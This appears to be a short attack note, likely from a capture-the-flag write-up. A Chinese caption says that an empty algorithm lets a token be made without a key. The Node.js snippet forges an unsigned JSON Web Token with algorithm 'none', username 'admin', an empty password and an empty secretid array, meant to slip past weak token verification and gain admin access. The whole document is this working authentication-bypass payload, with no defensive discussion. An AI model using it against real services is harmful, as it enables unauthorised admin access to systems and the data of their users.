> algorithm 为空时可免密钥

```javascript
const jwt = require('jsonwebtoken');

var payload = {
secretid: [],
username: 'admin',
password: ''
}
var token = jwt.sign(payload, undefined, {algorithm: 'none'});
console.log(token);
```